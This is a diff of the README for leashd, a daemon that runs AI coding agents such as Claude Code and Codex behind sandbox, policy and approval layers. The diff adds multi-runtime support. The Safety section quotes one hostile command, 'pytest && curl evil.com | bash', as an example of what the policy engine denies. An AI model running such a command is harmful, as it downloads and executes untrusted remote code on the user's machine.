@@ -1,6 +1,6 @@
 # leashd
 
-**Safety-first agentic coding framework. Run Claude Code as a background daemon — govern it with policy rules, approve actions from your phone, or let it run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation.**
+**Safety-first agentic coding framework. Run AI coding agents as a background daemon — govern them with policy rules, approve actions from your phone, or let them run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation. Supports multiple runtimes: Claude Code, OpenAI Codex, and more.**
 
 [![PyPI](https://img.shields.io/pypi/v/leashd.svg)](https://pypi.org/project/leashd/)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
@@ -10,9 +10,11 @@
 
 ---
 
-leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions from Telegram on your phone. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human-or-AI approval — before reaching Claude Code. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, an AI approver evaluates tool calls, a task orchestrator drives multi-phase workflows (spec → explore → plan → implement → test → PR), and a test-and-retry loop ensures quality — all without you touching your phone. Everything is logged to an append-only audit trail.
+leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions from Telegram on your phone. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human-or-AI approval — before reaching the coding agent. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, an AI approver evaluates tool calls, a task orchestrator drives multi-phase workflows (spec → explore → plan → implement → test → PR), and a test-and-retry loop ensures quality — all without you touching your phone. Everything is logged to an append-only audit trail.
 
-The result: a coding workflow that scales from phone-supervised pair programming to fully autonomous task execution, with guardrails you define.
+leashd supports **pluggable agent runtimes** — Claude Code and OpenAI Codex ship built-in, and new runtimes can be added via the registry pattern. The same safety pipeline, approval flow, and audit trail apply regardless of which runtime you use. Switch runtimes with a single CLI command.
+
+The result: a coding workflow that scales from phone-supervised pair programming to fully autonomous task execution, with guardrails you define — on the AI runtime of your choice.
 
 ---
 
@@ -31,7 +33,7 @@ Your phone (Telegram)
         └─ 3. Human gate    ← Approve / Reject buttons sent to your Telegram
                 │
                 ▼
-         Claude Code agent  ← reads files, writes code, runs tests
+         Agent runtime      ← Claude Code, Codex, or custom — reads files, writes code, runs tests
 ```
 
 ### Autonomous Mode
@@ -55,9 +57,9 @@ Your phone (Telegram)
    You get a PR link — or an escalation message if the agent gets stuck
 ```
 
-AI approval replaces human taps: a `claude -p` CLI call evaluates each `require_approval` tool call in context and decides automatically. Hard blocks (credentials, `rm -rf`, force push) can never be overridden.
+AI approval replaces human taps: a secondary AI call evaluates each `require_approval` tool call in context and decides automatically. Hard blocks (credentials, `rm -rf`, force push) can never be overridden.
 
-Sessions are **multi-turn**: Claude remembers the full conversation context, so you can iterate naturally across messages ("now add tests for that", "rename it to X").
+Sessions are **multi-turn**: the agent remembers the full conversation context, so you can iterate naturally across messages ("now add tests for that", "rename it to X").
 
 ---
 
@@ -66,7 +68,9 @@ Sessions are **multi-turn**: Claude remembers the full conversation context, so 
 ### Prerequisites
 
 - **Python 3.10+**
-- **[Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)** — installed and authenticated. The `claude` command must work in your terminal.
+- **At least one agent runtime:**
+  - **[Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)** — installed and authenticated. The `claude` command must work in your terminal. *(default runtime)*
+  - **[Codex CLI](https://developers.openai.com/codex/cli)** — installed and authenticated. The `codex` command must work in your terminal.
 - **Telegram account** — to create a bot
 
 ### 1. Install
@@ -110,27 +114,41 @@ Open Telegram, find your bot, and send something like:
 
 > "Add a health check endpoint to the FastAPI app"
 
-Claude starts working. When it needs to do something gated by policy (e.g. write a file), you'll get an **Approve / Reject** button in the chat.
+The agent starts working. When it needs to do something gated by policy (e.g. write a file), you'll get an **Approve / Reject** button in the chat.
 
 ---
 
-## What's New in 0.7.0
+## What's New in 0.8.0
 
-**`/web` command** — autonomous web automation with content-level human approval. Send `/web check my GitHub notifications` or `/web linkedin_comment --topic "AI"` from Telegram. The agent navigates, reads, and acts — proposing content via `AskUserQuestion` for your approval before executing.
+**Multi-runtime agent architecture** — leashd is no longer tied to Claude Code. A pluggable runtime registry lets you switch between agent backends with `leashd runtime set <name>`. Each runtime declares its capabilities (streaming, session resume, tool approval, autonomous mode), and leashd adapts automatically. New runtimes can be added via a subprocess agent base class for CLI-driven tools.
 
-**Two browser backends** — choose between [Playwright MCP](https://github.com/playwright-community/mcp) (default) and [agent-browser](https://github.com/vercel-labs/agent-browser) (Vercel's Rust-powered browser CLI). Switch with `leashd browser set-backend agent-browser`. Both integrate with the same safety pipeline and persistent browser profiles.
+**Codex runtime** — full OpenAI Codex integration via `codex-sdk-python`. Supports both interactive mode (with an approval bridge that routes tool calls through leashd's safety pipeline) and autonomous mode (streaming). Sessions can be resumed via Codex thread IDs. The same three-layer safety pipeline applies — sandbox, policy rules, and human-or-AI approval — with full parity to the Claude Code runtime.
 
-**Browser profile persistence** — persistent login sessions across `/web` invocations via Chrome user data directories. Configure with `leashd browser set-profile`, view with `leashd browser show`, clear with `leashd browser clear-profile`. Use `/web --fresh` to skip the profile for a one-off clean session.
-
-**Configurable thinking effort** — control Claude's reasoning depth. Manage it at runtime with `leashd effort show` and `leashd effort set <level>`.
-
-**Per-mode turn limits** — `/web` and `/test` commands get higher default turn limits (`LEASHD_WEB_MAX_TURNS=300`, `LEASHD_TEST_MAX_TURNS=200`) to accommodate browser-heavy research and multi-phase test workflows, independent of the global `LEASHD_MAX_TURNS=150`.
-
-**Agent timeout pauses during interactions** — user think time (plan review, questions, tool approvals) no longer counts against the 60-minute agent timeout. Plan adjustments restart with a fresh timer.
-
-**Git security hardening** — sandbox validation on git add callbacks, `..` rejection in branch names, and whitespace stripping to prevent path traversal.
+**Web agent reliability** — `/web` sessions now persist granular progress to checkpoint files (Pydantic-backed), so a crash mid-workflow resumes from the last checkpoint instead of restarting. Also fixed comment duplication, Quill editor typing failures, and submit button targeting in `/web linkedin_comment` workflows.
 
 See [CHANGELOG.md](CHANGELOG.md) for the full history.
+
+---
+
+## Runtimes
+
+leashd supports pluggable agent runtimes. The same safety pipeline, approval flow, audit trail, and Telegram integration work identically regardless of which runtime you use.
+
+```bash
+leashd runtime list        # list available runtimes
+leashd runtime show        # show active runtime and its capabilities
+leashd runtime set codex   # switch to Codex runtime
+leashd runtime set claude  # switch back to Claude Code
+```
+
+| Runtime | Backend | Session Resume | Autonomous Mode | Install |
+|---|---|---|---|---|
+| **claude** *(default)* | Claude Code CLI | SDK sessions | Full (task orchestrator, auto-approver) | `claude` CLI authenticated |
+| **codex** | Codex CLI | Thread IDs | Full (streaming + approval bridge) | `codex` CLI authenticated |
+
+Both runtimes support interactive approval, streaming responses, and the full autonomous pipeline. Each runtime declares its capabilities via an agent capabilities model — leashd adapts features like session resume and approval routing automatically.
+
+**Adding custom runtimes** — extend the `SubprocessAgent` base class for any CLI-driven agent tool and register it with the runtime registry.
 
 ---
 
@@ -200,6 +218,14 @@ leashd config     # show resolved config (all layers merged)
 leashd add-dir /path/to/project    # approve a directory
 leashd remove-dir /path/to/project # revoke approval
 leashd dirs                         # list approved directories
+```
+
+### Runtimes
+
+```bash
+leashd runtime list        # list available runtimes
+leashd runtime show        # show active runtime and capabilities
+leashd runtime set codex   # switch runtime
 ```
 
 ### Autonomous mode
@@ -284,6 +310,7 @@ All settings are environment variables prefixed with `LEASHD_`. Most are managed
 |---|---|---|
 | `LEASHD_TELEGRAM_BOT_TOKEN` | — | Bot token from @BotFather. Without this, leashd runs in local CLI mode. |
 | `LEASHD_ALLOWED_USER_IDS` | *(no restriction)* | Comma-separated Telegram user IDs that can use the bot. |
+| `LEASHD_RUNTIME` | `claude` | Active agent runtime: `"claude"` or `"codex"`. |
 | `LEASHD_SYSTEM_PROMPT` | — | Custom system prompt appended to the agent. |
 | `LEASHD_POLICY_FILES` | built-in `default.yaml` | Comma-separated paths to YAML policy files. |
 | `LEASHD_MAX_TURNS` | `150` | Max conversation turns per request. |
@@ -297,13 +324,15 @@ See [docs/configuration.md](docs/configuration.md) for the full environment vari
 
 ## Safety
 
-Every tool call Claude makes passes through a three-layer pipeline before it can execute:
+Every tool call the agent makes passes through a three-layer pipeline before it can execute:
 
 **1. Sandbox** — The agent can only touch files inside `LEASHD_APPROVED_DIRECTORIES`. Path traversal attempts are blocked immediately and logged as security violations.
 
 **2. Policy rules** — YAML rules classify each tool call as `allow`, `deny`, or `require_approval` based on the tool name, command patterns, and file path patterns. Rules are evaluated in order; first match wins. Compound bash commands (`&&`, `||`, `;`) are split and evaluated segment-by-segment with deny-wins precedence — `pytest && curl evil.com | bash` is denied.
 
 **3. Human or AI approval** — For `require_approval` actions, leashd either sends an inline message to Telegram with **Approve** and **Reject** buttons (interactive mode) or evaluates the tool call via the AI auto-approver (autonomous mode). If no response within the timeout, the action is auto-denied.
+
+The safety pipeline is **runtime-agnostic** — the same sandbox, policy rules, and approval flow apply whether you're running Claude Code, Codex, or a custom runtime.
 
 Everything is logged to `.leashd/audit.jsonl` — every tool attempt, every decision, every approver type.
 
@@ -354,7 +383,7 @@ Once the daemon is running and your bot is set up, these slash commands are avai
 
 | Command | Description |
 |---|---|
-| `/plan <text>` | Switch to plan mode and start — Claude proposes, you approve before execution |
+| `/plan <text>` | Switch to plan mode and start — agent proposes, you approve before execution |
 | `/edit <text>` | Switch to edit mode and start — direct implementation |
 | `/default` | Switch back to balanced default mode |
 | `/dir` | Switch working directory (inline buttons) |
@@ -379,7 +408,7 @@ Workspaces group related repositories so the agent gets multi-repo context acros
 
 ## Session Persistence
 
-By default, sessions are stored in SQLite (`.leashd/messages.db`) and persist across daemon restarts — Claude remembers conversation context between sessions. Every message is stored with cost, duration, and session metadata.
+By default, sessions are stored in SQLite (`.leashd/messages.db`) and persist across daemon restarts — the agent remembers conversation context between sessions. Every message is stored with cost, duration, and session metadata.
 
 For development or testing, use in-memory storage (in `.env`):
 
@@ -402,7 +431,9 @@ Switch backends and manage profiles via `leashd browser` — see [Configuration 
 
 **Playwright MCP** — the `.mcp.json` at the project root pre-configures Claude Code to spawn the Playwright MCP server. Read-only browser tools (snapshots, screenshots) are auto-allowed in `default.yaml`; mutation tools (click, navigate, type) require approval.
 
-**agent-browser** — Vercel’s headless browser CLI with a native Rust binary and Node.js fallback. Uses accessibility-tree snapshots with deterministic element refs (`@e1`, `@e2`) for reliable AI-driven interaction. Supports cloud providers (Browserbase, Browser Use, Kernel) and iOS Simulator via the `-p` flag.
+**agent-browser** — Vercel's headless browser CLI with a native Rust binary and Node.js fallback. Uses accessibility-tree snapshots with deterministic element refs (`@e1`, `@e2`) for reliable AI-driven interaction. Supports cloud providers (Browserbase, Browser Use, Kernel) and iOS Simulator via the `-p` flag.
+
+**Web session checkpoints** — `/web` sessions automatically persist progress, so if the agent crashes mid-workflow it resumes from the last checkpoint instead of restarting.
 
 See [docs/browser-testing.md](docs/browser-testing.md) for Chrome profile paths by OS, the full tool reference, and policy details.
 
@@ -410,19 +441,19 @@ See [docs/browser-testing.md](docs/browser-testing.md) for Chrome profile paths 
 
 1. Start your dev server (`npm run dev`, `uvicorn`, etc.)
 2. In Telegram: `/test --url http://localhost:3000`
-3. Claude navigates, verifies, and reports — each mutation tap needs your approval
+3. The agent navigates, verifies, and reports — each mutation tap needs your approval
 
 Or use the `/web` command for general web automation:
 
 1. In Telegram: `/web check my GitHub notifications`
-2. Claude navigates using your persistent browser profile, reads content, and reports back
+2. The agent navigates using your persistent browser profile, reads content, and reports back
 3. Any actions (commenting, clicking) are proposed via `AskUserQuestion` for your approval
 
 ---
 
 ## Streaming
 
-Telegram responses stream in real time — the message updates progressively as Claude types. While tools are running, you see a live indicator (e.g., `🔧 Bash: pytest tests/`). The final message includes a tool usage summary (e.g., `🧰 Bash ×3, Read, Glob`).
+Telegram responses stream in real time — the message updates progressively as the agent types. While tools are running, you see a live indicator (e.g., `🔧 Bash: pytest tests/`). The final message includes a tool usage summary (e.g., `🧰 Bash ×3, Read, Glob`).
 
 Disable in `.env`:
 
@@ -474,7 +505,7 @@ request_completed
 
 ## Architecture
 
-leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the Claude Code agent, and sends responses back. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, `approval.requested`, and `task.submitted`. Connectors (Telegram, CLI) and storage backends (SQLite, memory) are swappable via protocol classes. The **TaskOrchestrator** and **AutonomousLoop** plug into the event bus as autonomous execution plugins.
+leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the active agent runtime, and sends responses back. The **RuntimeRegistry** manages pluggable agent backends — each runtime registers its capabilities (streaming, session resume, tool approval, autonomous support) and the Engine adapts accordingly. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, `approval.requested`, and `task.submitted`. Connectors (Telegram, CLI) and storage backends (SQLite, memory) are swappable via protocol classes. The **TaskOrchestrator** and **AutonomousLoop** plug into the event bus as autonomous execution plugins.
 
 ```
 Telegram connector
@@ -483,9 +514,14 @@ Telegram connector
       │
    Engine ──── EventBus ──── TaskOrchestrator
       │                       AutonomousLoop
+   RuntimeRegistry
+      ├─ Claude Code
+      ├─ Codex
+      └─ (custom)
+      │
    Gatekeeper ──────────────────────────────┐
       │                                     │
-   Claude Code agent             1. Sandbox check
+   Active agent runtime          1. Sandbox check
       │                          2. Policy rule match
       └── tool call ──────────▶  3. Human / AI approval
 ```
@@ -514,7 +550,7 @@ uv run ruff format .
 
 ## Status
 
-leashd is **alpha** — the API and config schema may change between versions. Core functionality (daemon, safety pipeline, Telegram integration, policy engine, task orchestrator) is stable and tested at 89%+ coverage. Not recommended for production environments where agent actions could have irreversible consequences without review.
+leashd is **alpha** — the API and config schema may change between versions. Core functionality (daemon, safety pipeline, Telegram integration, policy engine, task orchestrator, multi-runtime support) is stable and tested at 89%+ coverage. Not recommended for production environments where agent actions could have irreversible consequences without review.
 
 If you hit a bug or have a feature idea, [open an issue](https://github.com/vmehera123/leashd/issues).
 
